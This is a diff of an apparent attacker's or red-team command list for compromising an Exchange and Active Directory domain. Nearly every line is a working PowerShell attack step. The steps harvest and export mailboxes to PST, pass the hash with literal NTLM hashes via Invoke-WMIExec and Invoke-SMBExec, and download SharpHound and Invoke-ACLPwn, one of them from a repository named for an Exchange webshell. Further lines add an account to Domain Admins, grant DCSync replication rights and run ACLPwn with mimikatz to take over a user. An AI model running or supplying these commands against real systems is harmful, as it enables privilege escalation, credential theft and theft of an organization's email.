@@ -2,7 +2,7 @@ Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-GlobalMailSearch -Imperson
 Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-SelfSearch -Mailbox HealthMailbox44abe0d@CHLNG.com -OtherUserMailbox; 
 Import-Module C:\\ProgramData\\pview.ps1; Get-NetUser | Sort-Object mail | ForEach-Object {$_.mail} | Out-File -Encoding ascii C:\\ProgramData\\emaillist.txt;
 
-Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2016; . $env:ExchangeInstallPath\\bin\\RemoteExchange.ps1; Connect-ExchangeServer -auto; Get-Help Get-Mailbox;
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; . $env:ExchangeInstallPath\\bin\\RemoteExchange.ps1; Connect-ExchangeServer -auto; Get-Help Get-Mailbox;
 
 powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-MailboxExportRequest
 powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; New-MailboxExportRequest -Mailbox \'chong@chlng.com\' -FilePath \'\\\\chlng.com\\C$\\ProgramData\\test.pst\';
@@ -39,12 +39,24 @@ powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-maste
 
 powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBExec -Target \'127.0.0.1\' -Domain \'chlng.com\' -Username CHLNG-WKS-1$ -Hash \'86fdb74721e95a00313dc72003155fc8\' -Command \'' -verbose
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/1.5/Ingestors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'ffc0139451b34fdb5f7ba33f0a75e086\' -Command \'^cmd /c ^Powershell C:\\ProgramData\\script.ps1 \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
+
+powershell Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-WMIExec.ps1\'; Invoke-WMIExec -Target \'localhost\' -Domain \'chlng.com\' -Username HealthMailbox88fa07b -Hash \'af698cc0102abb16bcacbbaa9bce7f9f\' -Command \'^cmd /c ^whoami /all \^\> C:\\ProgramData\\output30.txt 2^>^&1\' -verbose
+
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/3.0.0/Ingestors/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
 
 powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1\' -OutFile \'C:\\ProgramData\\SharpHound.ps1\'
 
-powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/SharpHound.exe\' -OutFile \'C:\\ProgramData\\SharpHound.exe\'
+powershell [Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\'; Invoke-WebRequest -Uri \'https://raw.githubusercontent.com/OreNPluS1/jscript_exchange_webshell/main/Invoke-ACLPwn.ps1\' -OutFile \'C:\\ProgramData\\Invoke-ACLPwn.ps1\'
 
-powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADGroupMember -Identity \'Replicating Directory Changes\' -Members HealthMailbox88fa07b
+powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Add-ADGroupMember -Identity \'Domain Admins\' -Members HealthMailbox88fa07b
 
 powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADGroupMember \'Domain Admins\'
+
+powershell $password = Get-Content C:\\ProgramData\\password.txt ; cd C:\\Windows\\SysWOW64\\inetsrv ; C:\\ProgramData\\Invoke-ACLPwn.ps1 -domain chlng.com -username HealthMailbox88fa07b -password $password -SharpHoundLocation C:\\ProgramData\\SharpHound.exe -mimiKatzLocation C:\\ProgramData\\mimikatz\\x64\\mimikatz.exe -userAccountToPwn chong
+
+powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; echo test; Get-ADPermission -Identity \'cn=HealthMailbox88fa07b,dc=chlng,dc=com\'
+
+powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; $id = [Security.Principal.WindowsIdentity]::GetCurrent(); Add-ADPermission \'chlng.com\' -User $id.Name -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All;
+
+Powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-ADPermission -Identity \'CN=HealthMailbox88fa07b4457a4de3bc3da6b5d4c5a1d9,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=CHLNG,DC=com\' ^| Write-Output 
